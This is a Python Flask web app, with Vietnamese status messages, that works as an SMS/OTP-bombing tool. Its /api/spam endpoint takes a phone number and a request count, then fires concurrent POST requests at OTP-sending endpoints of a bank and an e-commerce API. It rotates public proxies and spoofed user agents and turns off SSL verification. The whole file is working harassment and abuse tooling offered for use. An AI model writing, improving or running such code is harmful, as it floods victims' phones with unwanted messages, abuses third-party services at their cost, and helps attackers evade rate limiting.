from flask import Flask, request, jsonify, send_from_directory
import threading
import aiohttp
import asyncio
import random
import time

app = Flask(__name__, static_folder='.')

ENDPOINTS = [
    "https://api.bank.com/v1/send-otp",
    "https://api.ecommerce.com/auth/otp"
]

PROXIES = [
    "http://103.152.112.162:80", "http://47.243.178.134:80", 
    "http://154.65.39.7:80", "http://185.199.108.153:80"
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15"
]

async def send_req(session, sem, phone):
    async with sem:
        endpoint = random.choice(ENDPOINTS)
        proxy = random.choice(PROXIES)
        headers = {"User-Agent": random.choice(USER_AGENTS), "Content-Type": "application/json"}
        payload = {"phone": phone, "action": "send_otp"}
        
        try:
            async with session.post(endpoint, json=payload, headers=headers, proxy=proxy, timeout=5) as res:
                return res.status
        except:
            return 500

def run_spam(phone, amount):
    print(f"[*] Bắt đầu spam {amount} requests tới {phone}")
    async def main():
        sem = asyncio.Semaphore(100)
        connector = aiohttp.TCPConnector(limit=100, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = []
            for _ in range(amount):
                tasks.append(send_req(session, sem, phone))
            results = await asyncio.gather(*tasks)
            success = sum(1 for r in results if r in [200, 201, 202])
            print(f"[+] Hoàn tất! Thành công: {success}/{amount}")
            
    asyncio.run(main())

@app.route('/')
def home():
    return send_from_directory('.', 'index.html')

@app.route('/api/spam', methods=['POST'])
def api_spam():
    data = request.json
    phone = data.get('phone')
    amount = int(data.get('amount', 0))
    if not phone or amount <= 0:
        return jsonify({"message": "Dữ liệu không hợp lệ"}), 400
    threading.Thread(target=run_spam, args=(phone, amount)).start()
    return jsonify({"message": f"Đã nhận lệnh! Đang bắn {amount} requests tới {phone}"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
